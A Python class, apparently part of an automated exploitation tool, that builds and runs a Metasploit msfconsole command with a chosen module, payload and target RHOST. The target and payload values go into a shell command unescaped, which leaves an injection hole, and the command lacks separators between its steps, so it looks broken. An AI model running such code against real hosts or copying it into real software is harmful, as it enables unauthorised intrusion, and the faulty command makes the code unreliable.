from utils import setup_logger, execute_command
from config import LOG_DIR

logger = setup_logger('ExploitService', f"{LOG_DIR}/exploit_service.log")


class ExploitService:
    def __init__(self, cve_data, payload_data):
        self.cve_data = cve_data
        self.payload_data = payload_data

    def execute_exploit(self):
        """
        Executes exploitation using the payload.
        """
        if self.payload_data.get("status") != "success":
            logger.warning(f"Exploitation skipped for {self.cve_data['cve_id']}. No valid payload.")
            return {"status": "skipped", "message": "No valid payload."}

        command = (
            f"msfconsole -q -x 'use {self.cve_data['metasploit'].splitlines()[0].split(': ')[1]} "
            f"set PAYLOAD {self.payload_data['payload']} "
            f"set RHOST {self.cve_data['host']} run'"
        )
        result = execute_command(command, logger)

        if result["status"] == "success":
            return {"status": "success", "message": "Exploit executed successfully.", "command": command}
        return {"status": "error", "message": result["error"]}
